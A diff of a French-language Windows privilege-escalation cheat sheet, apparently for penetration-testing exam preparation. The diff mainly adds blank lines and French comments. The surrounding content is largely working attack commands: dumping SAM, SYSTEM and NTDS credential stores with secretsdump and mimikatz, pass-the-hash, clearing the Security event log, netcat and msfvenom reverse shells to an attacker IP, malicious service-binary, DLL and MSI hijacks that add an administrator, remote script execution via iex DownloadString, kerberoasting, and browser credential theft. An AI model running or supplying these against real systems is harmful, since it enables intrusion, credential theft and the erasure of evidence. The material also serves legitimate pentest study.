@@ -18,6 +18,7 @@ Auditer les services, jetons et configurations d'un poste Windows.
 
 ```powershell
 whoami
+
 ```
 
 
@@ -27,6 +28,7 @@ whoami
 
 ```powershell
 Get-LocalUser
+
 ```
 
 
@@ -38,6 +40,7 @@ Get-LocalUser
 
 ```powershell
 Get-LocalGroup
+
 ```
 
 
@@ -47,6 +50,7 @@ Get-LocalGroup
 
 ```powershell
 net localgroup
+
 ```
 
 
@@ -54,6 +58,7 @@ net localgroup
 
 ```powershell
 Get-LocalGroupMember -GroupName [GroupName]
+
 ```
 
 
@@ -64,6 +69,7 @@ Get-LocalGroupMember -GroupName [GroupName]
 
 ```powershell
 systeminfo
+
 ```
 
 
@@ -74,6 +80,7 @@ systeminfo
 
 ```powershell
 ipconfig /all
+
 ```
 
 
@@ -81,6 +88,7 @@ ipconfig /all
 
 ```powershell
 route print
+
 ```
 
 
@@ -88,6 +96,7 @@ route print
 
 ```powershell
 netstat -ano
+
 ```
 
 
@@ -98,6 +107,7 @@ netstat -ano
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+
 ```
 
 
@@ -105,6 +115,7 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVers
 
 ```powershell
 Select-Object -Property DisplayName
+
 ```
 
 
@@ -112,6 +123,7 @@ Select-Object -Property DisplayName
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
+
 ```
 
 
@@ -119,6 +131,7 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstal
 
 ```powershell
 Select-Object -Property DisplayName
+
 ```
 
 
@@ -128,6 +141,7 @@ Select-Object -Property DisplayName
 
 ```powershell
 Get-Process | Select-Object -Property ProcessName, Path
+
 ```
 
 
@@ -140,6 +154,7 @@ Get-Process | Select-Object -Property ProcessName, Path
 
 ```powershell
 Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
+
 ```
 
 
@@ -150,6 +165,7 @@ Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
 
 ```powershell
 Get-ScheduledTask | Select-Object TaskName, TaskPath, State
+
 ```
 
 
@@ -160,6 +176,7 @@ Get-ScheduledTask | Select-Object TaskName, TaskPath, State
 
 ```powershell
 Get-LocalGroupMember -GroupName "Administrators"
+
 ```
 
 
@@ -170,6 +187,7 @@ Get-LocalGroupMember -GroupName "Administrators"
 
 ```powershell
 Get-PSDrive -PSProvider FileSystem
+
 ```
 
 
@@ -180,6 +198,7 @@ Get-PSDrive -PSProvider FileSystem
 
 ```text
 $PSVersionTable.PSVersion
+
 ```
 
 
@@ -192,45 +211,60 @@ $PSVersionTable.PSVersion
 Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
 
 # D'autres bons foder pour les choses sont les dossiers web root, Windows ou Linux, par exemple dans Windows (C:\inetpub\wwwroot) certains fichiers de configuration pourraient avoir des chaînes codées en dur.
+
 ```
 
 
 ```powershell
+# Rechercher les bases KeePass (.kdbx)
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
 ```
 
 
 ```powershell
+# Rechercher les fichiers de configuration XAMPP
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
 ```
 
 
 ```powershell
+# Rechercher les sauvegardes et fichiers temporaires
 Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue
+
 ```
 
 
 ```powershell
+# Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path [Path] -File -Recurse | Where-Object { 
     (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }
 }
+
 ```
 
 
 ```powershell
+# Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length
+
 ```
 
 
 ```bash
+# Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
+
 ```
 
 
 ```powershell
+# Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
     (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }
 }
+
 ```
 
 
@@ -243,6 +277,7 @@ Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
 ```powershell
 # Remplacer [Domain\Username] par le nom d'utilisateur cible (par exemple, backupadmin). Vous serez invité à saisir le mot de passe de l'utilisateur spécifié.
 runas /user:[Domain\Username] cmd
+
 ```
 
 
@@ -259,6 +294,7 @@ Observer les permissions et la configuration de Windows.
 
 ```powershell
 (Get-PSReadlineOption).HistorySavePath
+
 ```
 
 
@@ -276,6 +312,7 @@ foreach ($profile in $userProfiles) {
         Write-Output ""
     }
 }
+
 ```
 
 
@@ -286,6 +323,7 @@ foreach ($profile in $userProfiles) {
 
 ```powershell
 whoami /priv
+
 ```
 
 
@@ -297,6 +335,7 @@ whoami /priv
 ```powershell
 .\EnableAllTokenPrivs.ps1
 whoami /priv
+
 ```
 
 
@@ -373,6 +412,7 @@ namespace Set_TokenPermission
 
 $type = Add-Type $definition -PassThru
 $type[0]::EnablePrivilege() 2>&1
+
 ```
 
 
@@ -397,6 +437,7 @@ $type[0]::EnablePrivilege() 2>&1
 
 ```text
 Authz Report Security Event
+
 ```
 
 
@@ -411,11 +452,13 @@ Authz Report Security Event
 
 ```text
 HKLM\SAM
+
 ```
 
 
 ```text
 HKLM\SYSTEM
+
 ```
 
 
@@ -434,11 +477,13 @@ HKLM\SYSTEM
 
 ```text
 HKLM\SAM
+
 ```
 
 
 ```text
 HKLM\SYSTEM
+
 ```
 
 
@@ -446,6 +491,7 @@ HKLM\SYSTEM
 
 ```text
 cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
+
 ```
 
 
@@ -457,6 +503,7 @@ cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
 
 ```text
 secretsdump.py -sam SAM -system SYSTEM LOCAL
+
 ```
 
 
@@ -469,6 +516,7 @@ secretsdump.py -sam SAM -system SYSTEM LOCAL
 
 ```text
 psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
+
 ```
 
 
@@ -476,6 +524,7 @@ psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
 
 ```text
 robocopy /b
+
 ```
 
 
@@ -483,6 +532,7 @@ robocopy /b
 
 ```text
 User Account Control
+
 ```
 
 
@@ -495,6 +545,7 @@ User Account Control
 
 ```text
 Restricted Admin
+
 ```
 
 
@@ -502,6 +553,7 @@ Restricted Admin
 
 ```text
 %WINDIR%\MEMORY.DMP
+
 ```
 
 
@@ -513,6 +565,7 @@ Restricted Admin
 
 ```text
 Backup Operators
+
 ```
 
 
@@ -524,11 +577,13 @@ Backup Operators
 
 ```powershell
 Import-Module .\SeBackupPrivilegeUtils.dll
+
 ```
 
 
 ```powershell
 Import-Module .\SeBackupPrivilegeCmdLets.dll
+
 ```
 
 
@@ -540,6 +595,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 
 ```text
 Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
+
 ```
 
 
@@ -624,6 +680,7 @@ Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
 
 ```text
 start /realtime SomeCpuIntensiveApp.exe
+
 ```
 
 
@@ -652,6 +709,7 @@ start /realtime SomeCpuIntensiveApp.exe
 
 ```text
 fltMC sysmondrv
+
 ```
 
 
@@ -684,6 +742,7 @@ fltMC sysmondrv
 
 ```text
 SYNCHRONIZE | FILE_TRAVERSE
+
 ```
 
 
@@ -716,6 +775,7 @@ SYNCHRONIZE | FILE_TRAVERSE
 
 ```text
 shutdown /s /f /m \\server1 /d P:5:19
+
 ```
 
 
@@ -744,11 +804,13 @@ shutdown /s /f /m \\server1 /d P:5:19
 
 ```text
 wevtutil cl Security
+
 ```
 
 
 ```text
 wevtutil sl Security /ms:0
+
 ```
 
 
@@ -763,6 +825,7 @@ wevtutil sl Security /ms:0
 
 ```text
 shutdown.exe /s /f /t 1
+
 ```
 
 
@@ -798,11 +861,13 @@ shutdown.exe /s /f /t 1
 
 ```text
 cmd.exe /c date 01-01-01
+
 ```
 
 
 ```text
 cmd.exe /c time 00:00
+
 ```
 
 
@@ -821,6 +886,7 @@ cmd.exe /c time 00:00
 
 ```text
 takeown.exe /f "%windir%\system32"
+
 ```
 
 
@@ -828,6 +894,7 @@ takeown.exe /f "%windir%\system32"
 
 ```text
 icacls.exe "%windir%\system32" /grant "%username%":F
+
 ```
 
 
@@ -849,6 +916,7 @@ icacls.exe "%windir%\system32" /grant "%username%":F
 
 ```text
 tzutil /s "Chatham Islands Standard Time"
+
 ```
 
 
@@ -884,6 +952,7 @@ tzutil /s "Chatham Islands Standard Time"
 
 ```bash
 python3 -m http.server 80
+
 ```
 
 ![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)
@@ -897,6 +966,7 @@ cerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe
 
 # PowerShell
 iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
+
 ```
 
 ![Downloading FullPowers.exe to victim machine.](https://www.emmanuelsolis.com/img/fullpowers_2.png)
@@ -920,6 +990,7 @@ iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
 
 # Démarrer un shell vers la machine de l'agresseur (exige que vous ameniez auparavant Netcat à la victime)
 ./FullPowers.exe -c "C:\Temp\nc64.exe [kali_ip] [port] -e cmd" -z
+
 ```
 
 ![Running FullPowers.exe.](https://www.emmanuelsolis.com/img/fullpowers_3.png)
@@ -933,6 +1004,7 @@ iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
 
 ```powershell
 whoami /priv
+
 ```
 
 ![Verifying our New Restored Privileges.](https://www.emmanuelsolis.com/img/fullpowers_4.png)
@@ -952,6 +1024,7 @@ whoami /priv
 ```powershell
 # Conseil: Recherchez des services avec des chemins en dehors de `system32` ou d'autres endroits inattendus.; essayez de trouver cette chose qui semble déplacée.
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
+
 ```
 
 
@@ -959,6 +1032,7 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 
 ```powershell
 icacls "C:\Path\To\ServiceBinary.exe"
+
 ```
 
 
@@ -966,6 +1040,7 @@ icacls "C:\Path\To\ServiceBinary.exe"
 
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
+
 ```
 
 
@@ -980,6 +1055,7 @@ int main ()
   system("net localgroup administrators emma /add");
   return 0;
 }
+
 ```
 
 
@@ -988,6 +1064,7 @@ int main ()
 ```bash
 # Cross-Compile the C Code to a 64-bit Application
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
 ```
 
 
@@ -999,6 +1076,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f e
 
 # Pour exécutable 32 bits
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
+
 ```
 
 
@@ -1015,6 +1093,7 @@ iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe
 move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"
 
 move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
+
 ```
 
 
@@ -1022,6 +1101,7 @@ move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
 
 ```powershell
 Restart-Service -Name '<ServiceName>'
+
 ```
 
 
@@ -1034,6 +1114,7 @@ Restart-Service -Name '<ServiceName>'
 ```powershell
 sc.exe stop <ServiceName>
 sc.exe start <ServiceName>
+
 ```
 
 
@@ -1045,6 +1126,7 @@ whoami /priv
 
 # Perform the restart
 shutdown /r /t 0
+
 ```
 
 
@@ -1056,6 +1138,7 @@ shutdown /r /t 0
 ```bash
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 python3 -m http.server 80
+
 ```
 
 
@@ -1070,6 +1153,7 @@ powershell -ep bypass
 Get-ModifiableServiceFile
 
 Install-ServiceBinary -Name '<ServiceName>'
+
 ```
 
 
@@ -1077,6 +1161,7 @@ Install-ServiceBinary -Name '<ServiceName>'
 
 ```powershell
 $ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal
+
 ```
 
 
@@ -1089,12 +1174,14 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Objec
         icacls $path
     }
 }
+
 ```
 
 
 ```powershell
 # Dépendances des services de la liste
 Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}
+
 ```
 
 
@@ -1103,6 +1190,7 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServi
 ```powershell
 # Certains services utilisent des fichiers de configuration qui peuvent être détournés de façon similaire aux binaires de service. Exemple : Vérification des autorisations dans un fichier de configuration
 icacls "C:\Path\To\Service\ConfigFile.ini"
+
 ```
 
 
@@ -1120,6 +1208,7 @@ flare-floss [downloaded_binary]
 # Utilisez dnSpy si vous savez que le binaire a été construit en utilisant .NET.
 
 # Vous pouvez également utiliser des outils tels que PEiD, IDA Pro, ou Ghidra pour analyser le binaire (ce n'est pas recommandé parce que l'examen n'est généralement pas aussi complexe et vous pourriez aller dans un trou de lapin).
+
 ```
 
 
@@ -1127,6 +1216,7 @@ flare-floss [downloaded_binary]
 
 ```powershell
 Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
+
 ```
 
 
@@ -1135,6 +1225,7 @@ Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
 ```powershell
 # Vérifier les paramètres de mise à jour du système qui pourraient revenir aux modifications
 Get-WindowsUpdateLog
+
 ```
 
 
@@ -1155,6 +1246,7 @@ Get-WindowsUpdateLog
 ```powershell
 # Lister les services en cours d'exécution et leurs chemins exécutables
 Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
+
 ```
 
 
@@ -1167,6 +1259,7 @@ Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-
 ```powershell
 # Affiche la variable d'environnement PATH
 $env:path
+
 ```
 
 
@@ -1187,6 +1280,7 @@ BOOL APIENTRY DllMain(
     }
     return TRUE;
 }
+
 ```
 
 
@@ -1195,6 +1289,7 @@ BOOL APIENTRY DllMain(
 ```bash
 # Cross-Compile the DLL
 x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
+
 ```
 
 
@@ -1206,6 +1301,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f d
 
 # Pour DLL 32 bits
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
+
 ```
 
 
@@ -1226,6 +1322,7 @@ move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"
 
 # Redémarrer le service
 Restart-Service -Name "[serviceToHijack]"
+
 ```
 
 
@@ -1237,6 +1334,7 @@ net user
 
 # Lister les administrateurs locaux pour vérifier si le nouvel utilisateur est un administrateur
 net localgroup administrators
+
 ```
 
 
@@ -1245,6 +1343,7 @@ net localgroup administrators
 ```powershell
 # Affiche la variable d'environnement PATH
 $env:path
+
 ```
 
 
@@ -1255,6 +1354,7 @@ $env:path
 
 ```powershell
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
 ```
 
 
@@ -1284,6 +1384,7 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 
 ```powershell
 icacls "<PathToDirectory>"
+
 ```
 
 
@@ -1299,6 +1400,7 @@ powershell -ep bypass
 
 # Liste des chemins de service non cités
 Get-UnquotedService
+
 ```
 
 
@@ -1321,6 +1423,7 @@ Get-Service -Name '<ServiceName>'
 
 # Vérifiez les journaux des événements liés au service
 Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}
+
 ```
 
 
@@ -1331,6 +1434,7 @@ Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -lik
 
 ```powershell
 schtasks /query /fo LIST /v
+
 ```
 
 
@@ -1338,6 +1442,7 @@ schtasks /query /fo LIST /v
 
 ```powershell
 icacls "C:\Path\To\ScheduledTaskExecutable.exe"
+
 ```
 
 
@@ -1349,6 +1454,7 @@ iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe
 move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak
 
 move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
+
 ```
 
 
@@ -1368,10 +1474,11 @@ tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    -
 tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  -
 udp    0.0.0.0:135        0.0.0.0:*                       -
 udp    192.168.1.9:500    0.0.0.0:*                       -
+
 ```
 
 
-## Cleartext Password Finding
+## Recherche de mots de passe en clair
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1385,20 +1492,22 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini
+
 ```
 
 
-### Searching in Configuration Files
+### Recherche dans les fichiers de configuration
 
 
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
 dir /s *pass* == *cred* == *vnc* == *.config*
+
 ```
 
 
-### Searching in All Files
+### Recherche dans tous les fichiers
 
 
 
@@ -1406,6 +1515,7 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 ```bash
 findstr /spin "password" *.*
 findstr /spin "password" *.*
+
 ```
 
 
@@ -1420,6 +1530,7 @@ c:\sysprep\sysprep.xml
 c:\unattend.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml
+
 ```
 
 
@@ -1432,6 +1543,7 @@ c:\unattend.xml
 dir c:\*vnc.ini /s /b
 dir c:\*ultravnc.ini /s /b 
 dir c:\ /s /b | findstr /si *vnc.ini
+
 ```
 
 
@@ -1451,18 +1563,20 @@ dir c:\ /s /b | findstr /si *vnc.ini
 `impacket-tool`  
 
 
-### Dumping SAM and SYSTEM Files
+### Sauvegarder les ruches SAM et SYSTEM
 
 
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
 ```powershell
 reg save hklm\sam <destination_path>\sam
+
 ```
 
 
 ```powershell
 reg save hklm\system <destination_path>\system
+
 ```
 
 
@@ -1472,6 +1586,7 @@ reg save hklm\system <destination_path>\system
 samdump2 <system_file> <sam_file>
 # Autre possibilité
 impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
+
 ```
 
 
@@ -1479,6 +1594,7 @@ impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 
 ```powershell
 mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
+
 ```
 
 
@@ -1491,6 +1607,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```powershell
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
+
 ```
 
 
@@ -1498,6 +1615,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\n
 
 ```powershell
 reg.exe save hklm\system <destination_path>\system.bak
+
 ```
 
 
@@ -1505,6 +1623,7 @@ reg.exe save hklm\system <destination_path>\system.bak
 
 ```bash
 impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
+
 ```
 
 
@@ -1512,6 +1631,7 @@ impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
 
 ```powershell
 mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
+
 ```
 
 
@@ -1524,11 +1644,13 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```powershell
 reg save hklm\security <destination_path>\security
+
 ```
 
 
 ```powershell
 reg save hklm\system <destination_path>\system
+
 ```
 
 
@@ -1536,6 +1658,7 @@ reg save hklm\system <destination_path>\system
 
 ```bash
 impacket-secretsdump -security <security_file> -system <system_file> LOCAL
+
 ```
 
 
@@ -1543,6 +1666,7 @@ impacket-secretsdump -security <security_file> -system <system_file> LOCAL
 
 ```powershell
 mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
+
 ```
 
 
@@ -1562,6 +1686,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```powershell
 reg load hku\TempHive <path_to_ntuser.dat>
+
 ```
 
 
@@ -1572,6 +1697,7 @@ reg load hku\TempHive <path_to_ntuser.dat>
 
 ```powershell
 vssadmin list shadows
+
 ```
 
 
@@ -1579,6 +1705,7 @@ vssadmin list shadows
 
 ```powershell
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
+
 ```
 
 
@@ -1602,6 +1729,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 
 # Vérifiez dans HKEY_CURRENT_USER pour la politique spécifique à l'utilisateur
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
 ```
 
 
@@ -1623,6 +1751,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f msi -o malicious.msi
+
 ```
 
 
@@ -1639,6 +1768,7 @@ set payload windows/x64/shell_reverse_tcp
 set LHOST <your_ip>
 set LPORT <your_port>
 run
+
 ```
 
 
@@ -1657,6 +1787,7 @@ msiexec /quiet /qn /i malicious.msi
 
 # Les drapeaux /quiet et /qn garantissent que l'installation fonctionne silencieusement sans interaction utilisateur
 # Le drapeau /i spécifie que vous installez le paquet MSI.
+
 ```
 
 
@@ -1667,16 +1798,19 @@ msiexec /quiet /qn /i malicious.msi
 
 ```powershell
 .\winPEAS.ps1
+
 ```
 
 
 ```powershell
 .\winPEAS.ps1 | tee winpeas_output.txt
+
 ```
 
 
 ```powershell
 .\winPEAS.ps1 | Out-File -FilePath winpeas_output.txt
+
 ```
 
 
@@ -1693,6 +1827,7 @@ python3 json2html.py peass.json peass.html
 
 # (Optional) We could also convert it to PDF.
 python3 json2pdf.py peass.json peass.pdf
+
 ```
 
 
@@ -1700,6 +1835,7 @@ python3 json2pdf.py peass.json peass.pdf
 
 ```powershell
 Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
+
 ```
 
 
@@ -1710,36 +1846,43 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 
 ```powershell
 .\powerup.ps1
+
 ```
 
 
 ```powershell
 .\PowerUp.ps1 -CheckMissingPatches
+
 ```
 
 
 ```powershell
 .\PowerUp.ps1 -UnquotedServicePaths
+
 ```
 
 
 ```powershell
 .\PowerUp.ps1 -CheckWritableServices
+
 ```
 
 
 ```powershell
 .\PowerUp.ps1 -ScheduledTasks
+
 ```
 
 
 ```powershell
 .\PowerUp.ps1 -WeakFilePermissions
+
 ```
 
 
 ```powershell
 .\PowerUp.ps1 -AutoDownloadBinaries
+
 ```
 
 
@@ -1750,21 +1893,25 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 
 ```powershell
 .\powercat.ps1 -c [target_IP] -p [port] -e [command]
+
 ```
 
 
 ```powershell
 .\powercat.ps1 -c [attacker_IP] -p [port] -e powershell.exe
+
 ```
 
 
 ```powershell
 .\powercat.ps1 -c [ATTACKER_IP] -p [PORT] -f [FILE_TO_SEND]
+
 ```
 
 
 ```powershell
 .\powercat.ps1 -c [TARGET_IP] -p [PORT] -s
+
 ```
 
 
@@ -1778,36 +1925,43 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 # Autre possibilité
 powershell -ExecutionPolicy bypass
 Import-Module ./PowerView.ps1
+
 ```
 
 
 ```powershell
 .\PowerView.ps1 -Command "Get-NetUser"
+
 ```
 
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetGroup -GroupName "Domain Admins"'
+
 ```
 
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetUser -SPN'
+
 ```
 
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetDomainController'
+
 ```
 
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetShare'
+
 ```
 
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetUser -Delegation'
+
 ```
 
 
@@ -1818,16 +1972,19 @@ Import-Module ./PowerView.ps1
 
 ```powershell
 .\PowerMad.ps1
+
 ```
 
 
 ```powershell
 .\PowerMad.ps1 -Command "Get-DomainAdminGroup"
+
 ```
 
 
 ```powershell
 .\PowerMad.ps1 -Command "Get-DomainAdminGroup" | Out-File -FilePath powermad_output.txt
+
 ```
 
 
@@ -1838,16 +1995,19 @@ Import-Module ./PowerView.ps1
 
 ```powershell
 .\PrivescCheck.ps1
+
 ```
 
 
 ```powershell
 .\PrivescCheck.ps1
+
 ```
 
 
 ```powershell
 .\PrivescCheck.ps1 | Out-File -FilePath privesccheck_output.txt
+
 ```
 
 
@@ -1858,6 +2018,7 @@ Import-Module ./PowerView.ps1
 
 ```powershell
 .\Seatbelt.exe
+
 ```
 
 
@@ -1869,6 +2030,7 @@ Import-Module ./PowerView.ps1
 ```bash
 git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
 cd PowerSharpPack
+
 ```
 
 
@@ -1876,6 +2038,7 @@ cd PowerSharpPack
 
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
+
 ```
 
 
@@ -1886,7 +2049,9 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 
 ```powershell
+# Examiner la propriété AMSIProviders avec Seatbelt
 PowerSharpPack -seatbelt -Command "AMSIProviders"
+
 ```
 
 
@@ -1897,51 +2062,70 @@ PowerSharpPack -seatbelt -Command "AMSIProviders"
 
 ```powershell
 PowerSharpPack -InternalMonologue
+
 ```
 
 
 ```powershell
+# Examiner la propriété AMSIProviders avec Seatbelt
 PowerSharpPack -seatbelt -Command "AMSIProviders"
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpWeb
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -UrbanBishop
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpUp
+
 ```
 
 
 ```powershell
+# Examiner la propriété kerberoast avec Seatbelt
 PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
+
 ```
 
 
 ```powershell
+# Examiner la propriété Persist avec Seatbelt
 PowerSharpPack -SharPersist -Command "Persist"
+
 ```
 
 
 ```powershell
+# Examiner la propriété Get-Domain avec Seatbelt
 PowerSharpPack -SharpView -Command "Get-Domain"
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -winPEAS
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpChromium
+
 ```
 
 
@@ -1955,17 +2139,23 @@ PowerSharpPack -SharpChromium
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpCloud
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpGPOAbuse
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SauronEye
+
 ```
 
 
@@ -1976,26 +2166,35 @@ PowerSharpPack -SauronEye
 
 ```powershell
 PowerSharpPack -SharpShares
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpSniper
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -SharpSpray
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -Grouper2
+
 ```
 
 
 ```powershell
+# Examiner un module PowerSharpPack
 PowerSharpPack -Watson
+
 ```
 
 
@@ -2006,6 +2205,7 @@ PowerSharpPack -Watson
 
 ```powershell
 PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example.com"
+
 ```
 
 
@@ -2020,6 +2220,7 @@ PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example
 
 ```text
 whoami /priv
+
 ```
 
 
@@ -2031,6 +2232,7 @@ whoami /priv
 
 ```text
 NT AUTHORITY\SYSTEM
+
 ```
 
 
@@ -2045,11 +2247,13 @@ NT AUTHORITY\SYSTEM
 
 ```bash
 DCOMPotato.exe -c "C:\Windows\System32\cmd.exe"
+
 ```
 
 
 ```bash
